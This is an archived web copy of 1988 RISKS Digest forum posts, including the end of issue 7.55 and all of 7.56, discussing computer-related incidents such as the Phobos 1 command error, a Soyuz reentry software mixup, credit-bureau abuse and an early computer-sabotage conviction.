Michael Trout (miket@brspyr1) =-=-=-=-=-=-= UUCP:brspyr1!miket
BRS Information Technologies, 1200 Rt. 7, Latham, N.Y. 12110  (518) 783-1161

</PRE>
<A NAME="subj2"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj2.1">
Re: Social content of video games (<A HREF="/Risks/7.49.html">RISKS-7.49</A> etc.)
</A>
</H3>
<address>
Tim Wood
&lt;<A HREF="mailto:mtxinu!sybase!linus!tim@ucbvax.Berkeley.EDU ">
mtxinu!sybase!linus!tim@ucbvax.Berkeley.EDU 
</A>&gt;
</address>
<i>
Wed, 14 Sep 88 19:28:23 PDT
</i><PRE>

The conditioning effect of violent video games should be at least as much of a
concern as the effect of similar content on viewers of ordinary TV.  Video
games do not present the spare, tokenized arena of chess or Monopoly; they
present a (speculative) graphical scene of the player's struggle toward the
goal.  When the player and the obstacles are cast in demeaning human
stereotypes, the game is degrading to play.  The key aspect of video games is
the explicit graphical interface that requires the player to focus on the
images of the game's creators rather than create his/her (possibly less hostile
in some cases) own mental images.

{ihnp4!pacbell,pyramid,sun,{uunet,ucbvax}!mtxinu}!sybase!tim

Voluntary disclaimer: This posting is solely my personal opinion.
		      It is not a representation of Sybase, Inc.

</PRE>
<A NAME="subj3"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj3.1">
re: Credit Doctors
</A>
</H3>
<address>
Dave Robbins 
&lt;<A HREF="mailto:dcr0%uranus@gte.com">
dcr0%uranus@gte.com
</A>&gt;
</address>
<i>
Fri, 16 Sep 88 14:40:04 EDT
</i><PRE>

donn@cs.utah.edu (Donn Seeley) quotes in Risks 7.50 portions of the
Newsweek article about credit doctors.  The concluding question is:

   Are credit bureaus' security measures really this lax?  It's not hard
   to believe, just appalling.

I have a couple of comments to add:

1) This type of activity is not uniquely a computer risk. I can imagine
   a computerless credit bureau, where records are kept on paper, and
   further imagine a 'credit doctor' fraudulently obtaining the
   credentials necessary to gain access to the credit bureau. The 'doctor'
   then calls up the credit bureau and obtains the desired information.
   The difference, of course, is that in this case the 'doctor' is
   probably dealing with a human at the credit bureau, and this human
   might by some chance figure out that the 'doctor' is up to no good.

2) The computer-related risk is, of course, that this sort of activity is
   much more likely to happen with computerized credit bureaus. The volume
   of information involved, and the anonymity of the individual making the
   request for credit information (via a terminal) make it much more
   difficult for requests to be validated and for fraudulent usage to be
   detected. This is just one more example of a well-known risk that is
   all too often not accounted for in the design of a system.

3) Surely there must be a reasonable way to provide legitimate access to
   credit information without making it so easy to obtain illegitimate
   access! As the credit bureaus operate today, any individual who knows
   how to access the credit bureau's computer can apparently locate
   anyone's credit information. It has been demonstrated that we cannot
   place much trust in those individuals at the banks, etc. who have
   access to the credit bureaus. I can imagine an individual whose credit
   information is on file at the credit bureau providing a unique
   'password' to the bank for the purpose of a credit check, but how then
   is that password protected from abuse? (I seem to remember a proposal
   for a relatively secure version of this sort of thing in CACM 3-4
   years ago.) Or is this an inevitable and unavoidable risk of having
   computerized records? I should hate to think so -- it might lead me
   to advocate keeping computers away from such sensitive records.

These issues are not really new, so I think I'll stop at this point,
and wait for the next creative abuse of computerized personal records
to pop up in the news.

</PRE>
<A NAME="subj4"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj4.1">
Virus in ROM on commodore 64
</A>
</H3>
<address>
Jurjen N.E. Bos
&lt;<A HREF="mailto:jurjen@cwi.nl ">
jurjen@cwi.nl 
</A>&gt;
</address>
<i>
Sat, 17 Sep 88 12:06:45 +0200
</i><PRE>

The commodore homecomputer has an EPROM containing the boot and basic software.
This ROM is in principle programmable only if the programming voltage is
applied.  In practice it is possible to modify the ROM by writing to it many
times.  This already caused a severe problems because a crashing program
destroyed the ROM in a computer of a friend of mine.  I do not know if there
already is a ROM virus on the 64, but I'm sure it is possible.  This makes
those computers more vulnerable to viruses than any other homecomputer.

</PRE>
<A NAME="subj5"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj5.1">
Re: Destructive remote controls
</A>
</H3>
<address>
&lt;<A HREF="mailto:attcan!utzoo!henry@uunet.UU.NET">
attcan!utzoo!henry@uunet.UU.NET
</A>&gt;
</address>
<i>
Sat, 17 Sep 88 00:26:17 EDT
</i><PRE>

&gt;	REMOTE WILL DAMAGE your home TV sets."

I'd say they're just trying to scare you.  I find it hard to imagine a remote
control that puts out enough infrared to even be competitive with direct
sunlight -- and any consumer product must be designed for the possibility of
lengthy periods of direct sunlight.
                                       Henry Spencer at U of Toronto Zoology

</PRE>
<HR><H3><A NAME="subj5.2">
Damage by remote controllers
</A>
</H3>
<address>
Jurjen N.E. Bos, CWI, Amsterdam
&lt;<A HREF="mailto:jurjen@cwi.nl ">
jurjen@cwi.nl 
</A>&gt;
</address>
<i>
Thu, 15 Sep 88 10:49:16 +0200
</i><PRE>

Talking about TV sets that are claimed to be damaged by remote controllers...
I happened to go to Disneyland lately where I saw the 3D movie "captain EO".
As you might know, this 3D effect is done using a special kind op polaroid
glasses.  They said after the movie was over:
    "Please do not take these glasses as a souvenir.  
    They will impair your vision outside this theatre."
There they go again! What's the difference between this theatre and the outside
world?  Those glasses will either impair your vision on the long run (which I
doubt) or they won't.  The only difference between the inside of the theatre
and the outside world is the 3D illusion they make.  
                                                       -- Jurjen N.E. Bos 

          [Irrelevant to computers, but nevertheless interesting
          as another example of the same approach!  PGN]

</PRE>
<A NAME="subj6"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj6.1">
Another one-key mishap
</A>
</H3>
<address>
Russ Nelson 
&lt;<A HREF="mailto:nelson@sun.soe.clarkson.edu">
nelson@sun.soe.clarkson.edu
</A>&gt;
</address>
<i>
Fri, 16 Sep 88 11:12:20 EDT
</i><PRE>

When I worked at HP, we acquired a new HP-IB hard disk drive with integral
tape backup.  To perform a backup or restore, you simply pull off the faceplate
and press disk-to-tape or tape-to-disk.  Both switches were identical, and
you can guess what eventually happened...

   [As you might guess, there are about 12 messages pending on variants
   of "rm" pitfalls and other single-keystroke fiascos.  We'll slow down
   on these for a while.  PGN]
   
</PRE>
<A NAME="subj7"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj7.1">
Re: ISDN/ANI - What one switch vendor told me
</A>
</H3>
<address>
Edwin Wiles
&lt;<A HREF="mailto:ewiles%netxcom@uunet.UU.NET ">
ewiles%netxcom@uunet.UU.NET 
</A>&gt;
</address>
<i>
Fri, 16 Sep 88 17:19:43 EDT
</i><PRE>

In RISKS 7.53 &lt;Allen L. Chesley&gt; Writes:
&gt;      Another point we had questions about, and they could not answer, is what
&gt; happens to all of those companies (like banks) who now do some business using
&gt; the touch-tone key pad.  Under ISDN, signalling uses the "D" channel, not one
&gt; of the voice carrying "B" channels.  Therefore you cannot listen and capture
&gt; touch-tones off of the conversation. 

I'm not absolutely certain that we are talking about the same thing, but
"Feature Group D" services do indeed allow you to capture touch tones off of
the conversation.  (I have worked with this, so I know something about it.)

The ANI signalling *is* done on different lines from the ones that carry the
conversation, and uses something other than DTMF.  However, once the ANI
signalling is done, the receiver of the call performs an "Acknowledgement Wink"
on the special line.  This opens the 'voice path', which is what carries both
the conversation, and any additional touch tones the caller sends.  (Such as a
command code to tell the bank what to do with your account.)

The RISKY thing about this setup, is that it takes an additional "Wink" to
'accept' the call.  Theoretically, you could complete your entire conversation
without sending that wink, and never be billed for the call since the telco
doesn't start billing until the call is 'accepted'.  Practically, if you did it
much, the telco would notice, and you would be "up the evil smelling tributary,
with no visible means of locomotion, and no knowledge of aquatics."

The reason for this setup is so a service can extract further addressing
information before the caller is billed.  This prevents a caller from being
billed for a call which cannot be completed.

DISCLAIMER: I do not work for any telephone company.
	    Neither I, nor my company, condone any illegal actions.

Edwin Wiles, NetExpress Comm., Inc., 1953 Gallows Rd. Suite 300 Vienna, VA 22180

</PRE>
<A NAME="subj8"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj8.1">
Call for Papers, Invitational Workshop on Data Integrity
</A>
</H3>
<address>
"RUTHBERG, ZELLA" 
&lt;<A HREF="mailto:ruthberg@ecf.icst.nbs.gov">
ruthberg@ecf.icst.nbs.gov
</A>&gt;
</address>
<i>
16 Sep 88 17:39:00 EDT
</i><PRE>

                         CALL FOR PAPERS
             Invitational Workshop on Data Integrity
                       January 25-27, 1989

                    Sponsored by and Held at
         National Institute of Standards and Technology
             (formerly National Bureau of Standards)
                     Gaithersburg, Maryland


The National Institute of Standards and Technology is sponsoring an
Invitational Workshop on Data Integrity to be held at NIST in Gaithersburg,
Maryland on January 25-27, 1989.  The Workshop will focus on the concepts of
data integrity and data quality, and the characteristics, metrics, and
principles needed to define and provide a suitable framework for data integrity
and data quality.

This invitational workshop is a follow-on to the October 27-29, 1987
invitational Workshop on Integrity and Privacy in Computer Information Systems
(WIPCIS).  The latter originated as a response to a paper by Clark and Wilson
presented at the IEEE Security and Privacy Conference in April, 1987.  That
paper compared commercial and military computer security policies.  The 1987
Workshop focused on commercial sector interpretations of the issues of
Assurance, Granularity and Function, Identity Verification, Auditing, and
System Correspondence to Reality and related these to a data integrity model.

A subsequently-formed data integrity working group of the NIST Computer and
Telecommunications Security (CTS) Council has proposed definitions for data
integrity and data quality.  These have been incorporated, along with other
conclusions, in a paper written by the working group chair Robert H. Courtney,
Jr.  It is intended that this paper serve as a strawman to stimulate responses
in the form of papers to be given at the January Workshop.  The Clark &amp; Wilson
paper would form an example within this framework.  Although computer and
telecommunications system integrity is broader than data integrity, consensus
findings about data integrity would contribute significantly to our
understanding and handling of the broader concerns of integrity.

Papers are being sought from the computer security community for presentation
at the Workshop.  Papers could address but need not be limited to the following
topics:
  o  Key principles for achieving data integrity.
  o  Key principles for achieving data quality.
  o  The application of principles to achieve integrity and quality of data.
  o  The attributes of data quality (other than accuracy, timeliness and
     completeness).
  o  Is confidentiality an attribute of data quality?
  o  Connection between Quality Assurance and data integrity.
  o  Connection between Quality Control and data quality.
  o  Relation between data quality and the value of data.
  o  Organization-specific data integrity/data quality policies derived from
     a body of principles.
  o  Cost-Benefit Relationships between security controls and data quality
     and integrity.
  o  Organizational structures for assigning data integrity, quality 
     assurance, and data quality functions.
  o  A realistic internal audit role relative to data integrity and quality.
  o  A reasonable external auditor role relative to data security and its
     subset data integrity.
  o  The relation of people roles (ADP staff, user, internal auditor, 
     quality assurance, quality control) to data integrity and quality.

Papers should be submitted by November 17, 1988 to:
  National Institute of Standards and Technology, Computer Security Division,
  Attn: Zella Ruthberg, A-216 Technology, Gaithersburg, Maryland 20899

Approximately six papers will be selected for presentation and
discussion.  Selections will be made by December 7, 1988.

The strawman paper will be sent on request.  For further background, people may
also request a copy of the report of the 1987 WIPCIS workshop.  The paper and
report are available from Robin Bickel at the above address or 301-975-3359.
For further information on the Workshop contact Zella Ruthberg at 301-975-3361.

</PRE>

<IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"><P>
<A HREF="/Risks/7.54.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.7.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/7.56.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
Report problems with the web pages to <A HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">Lindsay.Marshall@newcastle.ac.uk</A>.
</BODY></HTML>
</DOC>
<DOC>
<DOCNO>WT11-B32-8</DOCNO>
<DOCOLDNO>IA012-000131-B034-160</DOCOLDNO>
<DOCHDR>
http://catless.ncl.ac.uk:80/Risks/7.56.html 128.240.150.127 19970217023201 text/html 26002
HTTP/1.0 200 OK
MIME-Version: 1.0
Date: Mon, 17 Feb 1997 02:30:23 GMT
Server: phttpd/0.99.72
Content-Type: text/html
</DOCHDR>
<HTML><HEAD><TITLE>The Risks Digest Volume 7: Issue 56</TITLE>
<LINK REL="Prev" HREF="/Risks/7.55.html">
<LINK REL="Up" HREF="/Risks/index.7.html">
<LINK REL="Next" HREF="/Risks/7.57.html">
<LINK REL="Help" HREF="/Risks">
<LINK REV="made" HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">
</HEAD><BODY><HR>
<A HREF="/Risks/7.55.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.7.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/7.57.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
<H1>The Risks Digest Volume 7: Issue 56</H1>
<H2> Wednesday 21 September 1988 </H2>
    <H3>Forum on Risks to the Public in Computers and Related Systems</H3>
    <I><A HREF="http://www.acm.org">ACM</A>
Committee on Computers and Public Policy, Peter G. Neumann, moderator</I>
<H2>Contents</H2><DL>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj1">
Runaway mouse problem in popular commercial WP program 
</A>
<DD>
<A HREF="#subj1.1">
Jon Jacky
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj2">
  Wrapping Britain round the Greenwich meridian 
</A>
<DD>
<A HREF="#subj2.1">
Jack Campin
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj3">
  Crime and (indifferent) Punishment 
</A>
<DD>
<A HREF="#subj3.1">
Glen Matthews
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj4">
  Software Mixup on Soyuz Spacecraft 
</A>
<DD>
<A HREF="#subj4.1">
Karl Lehenbauer
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj5">
  RISKS of (Suspected) Crooks Running Dinosaur-DOS 
</A>
<DD>
<A HREF="#subj5.1">
Fred Baube
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj6">
  Multiple reservations and single bills 
</A>
<DD>
<A HREF="#subj6.1">
Jacob Hugart via Markus Stumptner
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj7">
  Complete info on the Phobos 1 
</A>
<DD>
<A HREF="#subj7.1">
Kaj Wiik via Ritchey Ruff
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj8">
  `Computer programmer convicted of creating "virus"' 
</A>
<DD>
<A HREF="#subj8.1">
Mike Linnig
</A><br>
</DL>

<A NAME="subj1"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj1.1">
Runaway mouse problem in popular commercial WP program
</A>
</H3>
<address>
Jon Jacky
&lt;<A HREF="mailto:jon@june.cs.washington.edu ">
jon@june.cs.washington.edu 
</A>&gt;
</address>
<i>
Mon, 19 Sep 88 09:17:04 PDT
</i><PRE>

From COMPUTERWORLD, Sept. 5, 1988, p. 39:

MICROSOFT SCRAMBLES TO HEAD OFF RUNAWAY MOUSE WITH WORD REWRITE -Steven Jones

Users running Microsoft's Mouse and Word 4.0 software program on IBM Personal
System/2 computers have inadvertantly sent Mouse on a wild spree by hitting
an uncommon combination of keystrokes and clicks.  The results include a 
variety of unwanted windows being opened and system freezes wherer the user
cannot get into the command line.  "It goes a little nutty," said Jeffrey
Sanderson, Microsoft's group product manager for word processing.

Microsoft said that, with the help of IBM, it determined the problem to be
with the PS/2's mouse port when the mouse was used to point and click with
Word.  Sanderson said the problem was spotted last February when users
started to complain about the wild mouse.

In all, Microsoft received about 200 calls from users that had an encounter
with the rowdy device.  Microsoft made a slight modification to Word to quiet
Mouse and began shipping the new version, called Word 4.00A, in May.

While Microsoft said that Word was the only part of its application software
line that experienced the problem, one user said he had similar difficulties
when running Xerox Corp.'s Ventura Publisher. ...

- Jonathan Jacky, University of Washington

</PRE>
<A NAME="subj2"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj2.1">
Wrapping Britain round the Greenwich meridian
</A>
</H3>
<address>
Jack Campin 
&lt;<A HREF="mailto:jack@cs.glasgow.ac.uk">
jack@cs.glasgow.ac.uk
</A>&gt;
</address>
<i>
19 Sep 88 15:20:36 GMT
</i><PRE>

A point related to the discussion about averaging angles is made by John Lamb
in the article "The everyday risks of playing safe" in New Scientist (8 Sept
1988). Describing the software used for air traffic control in the London area
by the Civil Aviation Authority on its IBM 9020 machine he writes:

	"One of the more startling problems concerned the program's handling
	 of the Greenwich meridian. The National Airspace Package, designed
	 by IBM's Federal Systems division, contains a model of the airspace
	 it controls, that is, a map of the airlanes and beacons in the area.
	 But, because the program was designed for air traffic control centres
	 in the US, the designers had taken no account of a zero longitude;
	 the deficiency caused the computer to fold its map of Britain in two
	 at the Greenwich meridian, plonking Norwich on top of Birmingham."

Jack Campin, Computing Science Dept., Glasgow Univ., 17 Lilybank Gardens,
Glasgow G12 8QQ, SCOTLAND     work 041 339 8855 x 6045; home 041 556 1878

</PRE>
<A NAME="subj3"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj3.1">
Crime and (indifferent) Punishment
</A>
</H3>
<address>
       Glen Matthews 
&lt;<A HREF="mailto:CCGM%MCGILLM.BITNET@CORNELLC.CCS.CORNELL.EDU">
CCGM%MCGILLM.BITNET@CORNELLC.CCS.CORNELL.EDU
</A>&gt;
</address>
<i>
WED 21 SEP 1988 08:15:00 EDT
</i><PRE>

In the Montreal Gazette (Tuesday Sept. 20 1988) a report appeared that
rounded out the story some months back re a Quebec firm selling welfare
information illicitly obtained as a result of co-operation of government
employees. Criminal charges against those involved were not laid due to
a decision by Crown prosecutors in May. However, the two civil servants
(by their actions I'd say most "uncivil" servants!) involved pleaded
guilty to a violation of Quebec's welfare act when they gave out
confidential information on welfare recipients.

According to the report, they were traced by using "security devices
built in to the computer system". It goes on to say that "each
government employee has a computer code, which automatically is logged
on all files he calls up".

The two were fined $100. Government officials have refused to say what
punishment the provincial government, their employer, has meted out.
Possible measures range from an oral reprimand, a note in the employee's
suspension, or firing. Had they been fired, I'd assume that this would
have been stated.

So, computer crime in Quebec, while perhaps not rewarded, is treated
with little urgency. With such a lenient approach to malefactors, I
wonder what other things are going on; certainly, this case provides
no deterrent to future "hi-jinks".

Glen Matthews, McGill University

</PRE>
<A NAME="subj4"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj4.1">
Software Mixup on Soyuz Spacecraft
</A>
</H3>
<address>
Karl Lehenbauer
&lt;<A HREF="mailto:karl@sugar.uu.net ">
karl@sugar.uu.net 
</A>&gt;
</address>
<i>
Wed, 21 Sep 88 8:00:04 CDT
</i><PRE>

According to Aviation Week (September 12, 1988, page 27), the second failed
reentry of the Soviet Soyuz-TM spacecraft on September 7, the engines were shut
down within seconds due to a computer problem:  "Instead of using the descent
program worked out for the Soviet-Afghan crew, the computer switched to a
reentry program that had been stored in the Soyuz TM-5 computers in June for a
Soviet-Bulgarian crew.  Soviet officials said last week that they did not
understand why this computer mixup occured."

The article notes that the crew was committed to a reentry because they had
jettisoned the orbital module that contained equipment that would be needed to
redock with the Mir space station.

The article also noted that Geoffrey Perry, an analyst of Soviet space
activities with the Kettering Group, "said the crew was not flying in the same
Soyuz that they were launched in, but instead were in a spacecraft that had
been docked with the Mir for about 90 days.  He said that is about one-half the
designed orbital life of the Soyuz."
                                                      -karl

</PRE>
<A NAME="subj5"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj5.1">
RISKS of (Suspected) Crooks Running Dinosaur-DOS
</A>
</H3>
<address>
"F.Baube" 
&lt;<A HREF="mailto:fbaube@note.nsf.gov">
fbaube@note.nsf.gov
</A>&gt;
</address>
<i>
Wed, 21 Sep 88 10:43:07 -0400
</i><PRE>

The WashPost (Mon Sep 19) had a story on the procurement investigation.

"Sometimes, however, investigators hit unexpected roadblocks.  In a search of
consultant James Neal last June, for example, FBI agents seized computer disks
only to find they couldn't run them on the agency's computers.  So they
subpoenaed Neal's vintage machine, gently suggesting in the subpoena that he
might be kind enough to help the FBI agents by demonstrating how it works.

When Neal sought to have the subpoena quashed, [the judge] ruled that the
government could have the computer for five working days.  But, he added, "I
don't understand a subpoena asking for assistance.  The government will have to
learn to work the machine itself."

#include &lt;disclaimer.h&gt;

</PRE>
<A NAME="subj6"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj6.1">
Multiple reservations and single bills
</A>
</H3>
<address>
Markus Stumptner
&lt;<A HREF="mailto:mcvax!tuhold!markus@uunet.UU.NET ">
mcvax!tuhold!markus@uunet.UU.NET 
</A>&gt;
</address>
<i>
Mon, 19 Sep 88 20:06:54 -0100
</i><PRE>

This is an article which appeared a few weeks ago in recs.arts.sf-lovers.
It shows a case where, even after the error had become known, the hotel
staff were unable to correct it. 

I have not attempted to verify the story. Only the hotel name was changed
to protect the incompetent.

(P.S. No mention is made in the article of a computerized reservation
system. After reading it, however, I rule out the possibility of
unsupported humans botching it this bad.)

    Markus Stumptner, Technical University of Vienna, Paniglgasse 16, 
    A-1040 Vienna, Austria                 UUCP: tuvie!tuhold!markus

 = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = =

From: GWCHUGPG@uiamvs.BITNET (Jacob Hugart)
Newsgroups: rec.arts.sf-lovers
Subject: Conventions and Hotels
Message-ID: &lt;8808261600.AA12810@rutgers.edu&gt;
Date: 26 Aug 88 16:00:22 GMT

Hotels, Conventions, and People don't mix.

Here's a horror story for you.

A good friend of mine, Jordan Orzoff, is a gamer.  Not a geek, but a devoted
role-player.  Anyway, he was going to GM a game at GenCon/Origins, based upon
a scenario he used on some of his friends.  Because he was going to judge a
game, he got his judge's pre-registration packet early.  This came with a
hotel reservation form which he filled out and listed me as a roommate.

We received our confirmation from the &lt;XYZ&gt; Hotel (our first choice) and
from GenCon.  Great, no problem.

When we arrived in Milwaukee, Wisconsin, we went to the &lt;XYZ&gt; and asked
about our room.  The desk person said that no rooms were available now, but a
reservation for Nathan Orzoff and Jacob Hugart was listed.

Here's where the fun begins.  Jordan has a well-know cousin named Nathan
Orzoff, who is well-known in some gaming areas, and whom Jordan had never met.
We asked the desk person if there was another Orzoff listed, and he said no.
He also said he'd change the first name.  Jordan said he probably shouldn't,
Nathan might show up.  In any case, we couldn't check-in until 3pm.

We arrive at 3pm.  Jordan gets in line.  After a bit, he calls me up and
introduces me to his cousin, Nathan.  Nathan and a friend had also reserved a
room at the &lt;XYZ&gt; for GenCon.  Unfortunately, I had a reservation with
Nathan and Jordan had a reservation with Nathan's friend.  All four of us were
placed in the same room, with one double-bed.

Since Jordan and I had our &lt;XYZ&gt; confirmations, we got the room right
away, and Nathan and friend got one too, after a bit.  Jordan payed his
downpayment with Visa, I with American Express.

After four days, when GenCon was over, Jordan and I had to check out.  He had
received two bills, one for him, one for me.  When we looked closely at the
bills, both of them had Nathan Orzoff's address on them, and mine had my name
as "Jordan, Hugart" whereas Jordan's was "Orzoff, Jordan."  So now we have
five people in this room, according to the reservations: Jordan Orzoff, Nathan
Orzoff, Nathan's friend, me (Jacob Hugart), and Hugart Jordan.

All reserved and billed in the same room with one double-bed.

Since the bills had a "Balance Due" line, we went to the desk and said we'd
like to check out and pay our bills.  The person at the desk looked up our
account on the computer, and said we were already checked out.  News to us.
Also, our bills had been paid in full.  More news.  The desk person showed us
the receipts we had signed.  Fine.

Jordan has a theory.  He believes Nathan got stuck with our bills, and paid
them.  That would explain how we checked out before we checked out.  But it
doesn't explain why one bill would be paid on AmEx, the other on Visa.

I liked the &lt;XYZ&gt;. But I wouldn't trust their reservation system as far
as I can spit it.

</PRE>
<A NAME="subj7"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj7.1">

</A>
</H3>
<address>
&lt;<A HREF="mailto:ruffwork@edison.cs.orst.edu">
ruffwork@edison.cs.orst.edu
</A>&gt;
</address>
<i>
Wed, 21 Sep 88 14:07:33 PDT
</i><PRE>

This is via Kaj Wiik in Finland (he is an associate of Gilbert Leppelmeir).  It
is reprinted with permission (I suggest people try to get permission, it's not
only the "correct" way to do it, but it can also be fun! Right, Eugene?).

It was such a twisted set of "coincidences" it could only happen in 
real life.  From this note the following questions come to mind:
	- the probes are programmed "real time" ?
	- they are programmed in a very low level language ?
	- the code isn't verified before transmission ?
	- there is no continous telemetry from the probe ?
	- there is no "sanity check" in the probe, and no
	  "panic" mode (as several have told me NASA uses)
	  to keep the probe from doing really dumb things ?

At least the "hopper" is on Phobos 2 instead of Phobos 1...

--Ritchey Ruff	ruffwork@cs.orst.edu -or- ...!tektronix!orstcs!ruffwork

------- Forwarded Message

Return-Path: @cunyvm.cuny.edu:kwi%kolvi.hut.fi@santra.hut.fi
To: ruffwork@mist.cs.orst.edu (Ritchey Ruff)
Date: Wed, 21 Sep 88 17:06:21 EET DST
From: Kaj Wiik &lt;kwi%kolvi.hut.fi@cunyvm.cuny.edu&gt;
Subject: Re: Soviet Mars probe PHOBOS 1 communications lost enroute

No problems, you can publish the notes. There were some inaccuracies in the
original posting concerning the author, so could you please publish the
following, corrected version.

Kaj Wiik   kwi@kolvi.HUT.FI   kwi@finhutee.bitnet

 = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = =

      Phobos I news
      Gilbert W. Leppelmeier  12.9.88
      VTT (Finnish Technical Research Centre),
      Instrument laboratory


      At the last session of the meeting of the International
      Science Committee of the Spectrum-X-Gamma project,
      Friday, 9.9.88, Prof. R. Sagdeev gave a presentation of
      "all we know at present about what has happened to
      Phobos I".  These are my notes from that presentation.
      (Not an official IKI announcement)

      A few weeks ago it was decided to move the control of
      Phobos I from the Crimean Space Center to a Center near
      Moscow.  Among other things, this involved using a new
      computer with a different keyboard.  Traps were
      installed in the new operating system to catch
      characteristic operator errors, including one wherein an
      operator now had to insert a particular character at the
      end of a command.  If he failed to do so, a reminder
      would come on the screen asking him if he had forgotten
      to do so, and the computer would not continue unless
      the character were included, OR the operator
      specifically overode the computer.

      On 29.8.88 a very long message was being prepared for
      transmission to Phobos I.  At one point, near the end of
      the message, the operator failed to add the character,
      the computer stopped, but failed to display the question
      on the screen.  The operator thought it was a computer
      error and overode the stop.  The absence of the
      particular character changed the bit pattern of the
      following instruction, into a bit pattern, not on the
      list of accepted commands, but which did call an area of
      the onboard ROM which had a list of possible commands,
      used in development and left there for possible future
      use.  Unfortunately, the particular pattern created in
      this error translated into turning off the attitude
      control thrusters.

      Two days later the Control Center sent a message to
      Phobos I and received no answer.  It is now believed
      that as the spacecraft slowly changed orientation it
      lost power, because the solar panels no longer faced the
      sun, and everything turned off.  The serious concern is
      that many items [from private conversations I gather
      both in spacecraft support and instruments] need
      electrical power to avoid becoming too cold, and will
      be permanently damaged if they get too cold.

      Sagdeev listed the following points as links in the
      chain:
           - error on operator's part
           - computer failure
           - operator decision to circumvent computer
           - absence of cross checks
           - actual command sent able to enter ROM
           - The OB computer must be programmed to prevent
      suicide.  [I believe RS said the OBCPU was 8-bit.  You
      can't do much checking with such a small cpu on such a
      large spacecraft.]

      This is the first failure of a Soviet deep space spacecraft
      since 1972.


Added 14.9:  This is what I wrote when I returned from Moscow.
 Looking at my notes, I realise that the move of control center
 may have taken place on 29.8 and the transmission error later.

------- End of Forwarded Message

</PRE>
<A NAME="subj8"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj8.1">
`Computer programmer convicted of creating "virus"'
</A>
</H3>
<address>
&lt;<A HREF="mailto:linnig@skacsl.csc.ti.com">
linnig@skacsl.csc.ti.com
</A>&gt;
</address>
<i>
Tue, 20 Sep 88 20:56:26 CDT
</i><PRE>

From  9/19/88 Ft. Worth Star-Telegram

  A 40-year-old computer programmer was convicted last night of deliberately
creating a computer "virus" -- a series of destructive programs, one of which
was used to delete records from his company's computer within days after he was
fired.
  A Tarrant County jury deliberated about six hours before convicting Donald
Gene Burleson of harmful access to a computer with valued loss and damage of
more than $2,500.
  Burleson's trial was considered a landmark case because he was the first
person tried under a 1985 Texas law prohibiting computer sabotage. It also may
have been one of the first such trials in the nation, trial Judge John Bradshaw
told jurors after the verdict.
  Prosecutor Davis McCown said the verdict proves that computer crime is not
impossible to prosecute.
